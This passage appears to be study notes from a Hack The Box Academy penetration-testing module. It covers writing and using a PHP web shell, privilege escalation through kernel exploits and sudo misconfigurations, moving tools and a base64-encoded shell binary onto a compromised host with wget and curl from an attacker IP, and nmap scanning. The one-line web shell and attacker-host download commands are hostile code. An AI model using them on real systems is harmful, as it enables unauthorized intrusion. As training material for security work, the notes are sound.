&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /var/www/html/shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;accessing-web-shell&quot;&gt;Accessing Web Shell&lt;/h4&gt;

&lt;p&gt;Once we write our web shell, we can either access it through a browser or by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cURL&lt;/code&gt;. We can visit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; page on the compromised website, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=id&lt;/code&gt; to execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another option is to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cURL&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;Types of Shells&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://SERVER_IP:PORT/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;443&lt;/code&gt;, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.&lt;/p&gt;

&lt;p&gt;On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt; script to automate this process and give us a semi-interactive web shell right within our terminal.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;hr /&gt;

&lt;p&gt;Our initial access to a remote server is usually in the context of a low-privileged user, which would not give us complete access over the box. To gain full access, we will need to find an internal/local vulnerability that would escalate our privileges to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linux&lt;/code&gt; or the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYSTEM&lt;/code&gt; user on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows&lt;/code&gt;. Let us walk through some common methods of escalating our privileges.&lt;/p&gt;

&lt;p&gt;https://gtfobins.github.io/&lt;/p&gt;

&lt;h2 id=&quot;enumeration-scripts&quot;&gt;Enumeration Scripts&lt;/h2&gt;

&lt;p&gt;Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include &lt;a href=&quot;https://github.com/rebootuser/LinEnum.git&quot;&gt;LinEnum&lt;/a&gt; and &lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker&quot;&gt;linuxprivchecker&lt;/a&gt;, and for Windows include &lt;a href=&quot;https://github.com/GhostPack/Seatbelt&quot;&gt;Seatbelt&lt;/a&gt; and &lt;a href=&quot;https://github.com/411Hall/JAWS&quot;&gt;JAWS&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Another useful tool we may use for server enumeration is the &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;Privilege Escalation Awesome Scripts SUITE (PEASS)&lt;/a&gt;, as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.&lt;/p&gt;

&lt;h2 id=&quot;kernel-exploits&quot;&gt;Kernel Exploits&lt;/h2&gt;

&lt;p&gt;Whenever we encounter a server running an old operating system, we should start by looking for potential kernel vulnerabilities that may exist. Suppose the server is not being maintained with the latest updates and patches. In that case, it is likely vulnerable to specific kernel exploits found on unpatched versions of Linux and Windows.&lt;/p&gt;

&lt;p&gt;For example, the above script showed us the Linux version to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3.9.0-73-generic&lt;/code&gt;. If we Google exploits for this version or use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;, we would find a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2016-5195&lt;/code&gt;, otherwise known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DirtyCow&lt;/code&gt;. We can search for and download the &lt;a href=&quot;https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs&quot;&gt;DirtyCow&lt;/a&gt; exploit and run it on the server to gain root access.&lt;/p&gt;

&lt;p&gt;The same concept also applies to Windows, as there are many vulnerabilities in unpatched/older versions of Windows, with various vulnerabilities that can be used for privilege escalation. We should keep in mind that kernel exploits can cause system instability, and we should take great care before running them on production systems. It is best to try them in a lab environment and only run them on production systems with explicit approval and coordination with our client.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vulnerable-software&quot;&gt;Vulnerable Software&lt;/h2&gt;

&lt;p&gt;Another thing we should look for is installed software. For example, we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dpkg -l&lt;/code&gt; command on Linux or look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Program Files&lt;/code&gt; in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;user-privileges&quot;&gt;User Privileges&lt;/h2&gt;

&lt;p&gt;Another critical aspect to look for after gaining access to a server is the privileges available to the user we have access to. Suppose we are allowed to run specific commands as root (or as another user). In that case, we may be able to escalate our privileges to root/system users or gain access as a different user. Below are some common ways to exploit certain user privileges:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Sudo&lt;/li&gt;
  &lt;li&gt;SUID&lt;/li&gt;
  &lt;li&gt;Windows Token Privileges&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root ‘like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;’ or allow the user to access certain root-only directories. We can check what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; privileges we have with the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/strong&gt; command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/user2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;  
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user1 on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin  
  
User user1 may run the following commands on ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:  
   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user2 : user2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /bin/bash  
user1@ng-1768569-gettingstartedprivesc-j7l2z-7c9854d6d9-6rx8s:/home/user2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;as you can see there’s sudo user2 bash possibility to read flag on his &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/user2&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;transferring-files&quot;&gt;Transferring Files&lt;/h1&gt;

&lt;p&gt;During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Upload&lt;/code&gt; command to upload a file, we need to learn methods to transfer files with a standard reverse shell.&lt;/p&gt;

&lt;h2 id=&quot;wget&quot;&gt;Wget&lt;/h2&gt;

&lt;p&gt;There are many methods to accomplish this. One method is running a &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server&quot;&gt;Python HTTP server&lt;/a&gt; on our machine and then using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cURL&lt;/code&gt; to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000

Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: &lt;span class=&quot;s1&quot;&gt;&apos;linenum.sh&apos;&lt;/span&gt;

linenum.sh 100%[&lt;span class=&quot;o&quot;&gt;==============================================&amp;gt;]&lt;/span&gt; 144.86K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.02s

2021-02-08 18:09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.16 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;&apos;linenum.sh&apos;&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14337/14337]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that we used our IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.14.1&lt;/code&gt; and the port our Python server runs on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt;. If the remote server does not have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cURL&lt;/code&gt; to download the file:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://10.10.14.1:8000/linenum.sh &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; linenum.sh

100  144k  100  144k    0     0  176k      0 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;:--:-- 176k
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that we used the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-o&lt;/code&gt; flag to specify the output file name.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;using-scp&quot;&gt;Using SCP&lt;/h2&gt;

&lt;p&gt;Another method to transfer files would be using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;, granted we have obtained ssh user credentials on the remote host. We can do so as follows:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost&lt;span class=&quot;s1&quot;&gt;&apos;s password: *********
linenum.sh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that we specified the local file name after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scp&lt;/code&gt;, and the remote directory will be saved to after the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;using-base64&quot;&gt;Using Base64&lt;/h2&gt;

&lt;p&gt;In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to &lt;a href=&quot;https://linux.die.net/man/1/base64&quot;&gt;base64&lt;/a&gt; encode the file into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; format, and then we can paste the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; string on the remote server and decode it. For example, if we wanted to transfer a binary file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt;, we can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; encode it as follows:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64 &lt;/span&gt;shell &lt;span class=&quot;nt&quot;&gt;-w0&lt;/span&gt;

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &amp;lt;SNIP&amp;gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can copy this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; string, go to the remote host, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64 -d&lt;/code&gt; to decode it, and pipe the output into a file:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... &amp;lt;SNIP&amp;gt; ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;validating-file-transfers&quot;&gt;Validating File Transfers&lt;/h2&gt;

&lt;p&gt;To validate the format of a file, we can run the &lt;a href=&quot;https://linux.die.net/man/1/file&quot;&gt;file&lt;/a&gt; command on it:&lt;/p&gt;

&lt;p&gt;Transferring Files&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@remotehost&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, no section header
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, when we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; command on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5sum&lt;/code&gt; on it:&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;nmap-enumeration&quot;&gt;Nmap Enumeration&lt;/h1&gt;

&lt;p&gt;Nmap offers many different scanning techniques, making different types of connections and using differently structured packets to send. Here we can see all the scanning techniques Nmap offers:&lt;/p&gt;

&lt;p&gt;If our target sends a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYN-ACK&lt;/code&gt; flagged packet back to us, Nmap detects that the port is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; localhost

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-06-11 22:50 UTC
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;localhost &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;127.0.0.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000010s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
5901/tcp open  vnc-1

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.18 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;| &lt;strong&gt;Scanning Options&lt;/strong&gt; | &lt;strong&gt;Description&lt;/strong&gt;                                                          |
| ——————– | ———————————————————————— |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.2.0/24&lt;/code&gt;      | Target network range.                                                    |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sn&lt;/code&gt;                | Disables port scanning.                                                  |
| &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oA tnet&lt;/code&gt;           | Stores the results in all formats starting with the name ‘tnet’.         |
| -&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PE&lt;/code&gt;                | Performs the ping scan by using ‘ICMP Echo requests’ against the target. |
This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not. We will take a closer look at these techniques in “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Firewall and IDS Evasion&lt;/code&gt;”.&lt;/p&gt;

&lt;p&gt;By default, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; scans the top 1000 TCP ports with the SYN scan (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt;). This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sT&lt;/code&gt;) is performed by default. This means that if we do not define ports and scanning methods, these parameters are set automatically. We can define the ports one by one (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 22,25,80,139,445&lt;/code&gt;), by range (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 22-445&lt;/code&gt;), by top ports (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--top-ports=10&lt;/code&gt;) from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; database that have been signed as most frequent, by scanning all ports (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;) but also by defining a fast port scan, which contains top 100 ports (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-F&lt;/code&gt;).&lt;/p&gt;

&lt;h2 id=&quot;discovering-open-udp-ports&quot;&gt;Discovering Open UDP Ports&lt;/h2&gt;

&lt;p&gt;Some system administrators sometimes forget to filter the UDP ports in addition to the TCP ones. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt; is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stateless protocol&lt;/code&gt; and does not require a three-way handshake like TCP. We do not receive any acknowledgment. Consequently, the timeout is much longer, making the whole &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP scan&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sU&lt;/code&gt;) much slower than the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP scan&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;Let’s look at an example of what a UDP scan (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sU&lt;/code&gt;) can look like and what results it gives us.&lt;/p&gt;

&lt;h4 id=&quot;udp-port-scan&quot;&gt;UDP Port Scan&lt;/h4&gt;

&lt;p&gt;Host and Port Scanning&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap 10.129.2.28 &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt;

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-06-15 16:01 CEST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.2.28
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.059s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 95 closed ports
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
631/udp  open|filtered ipp
5353/udp open          zeroconf
MAC Address: DE:AD:00:00:BE:EF &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel Corporate&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;98.07 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;|&lt;strong&gt;Scanning Options&lt;/strong&gt;|&lt;strong&gt;Description&lt;/strong&gt;|
|—|—|
|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.2.28&lt;/code&gt;|Scans the specified target.|
|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-F&lt;/code&gt;|Scans top 100 ports.|
|&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sU&lt;/code&gt;|Performs a UDP scan.|&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Scanning Options&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.129.2.28&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scans the specified target.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Scans all ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oA target&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Saves the results in all formats, starting the name of each file with ‘target’.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--stats-every=5s&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Shows the progress of the scan every 5 seconds.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sV&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Performs service version detection on specified ports.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-Pn&lt;/td&gt;
      &lt;td&gt;Disable icmp requests&lt;/td&gt;
    &lt;/tr&gt;
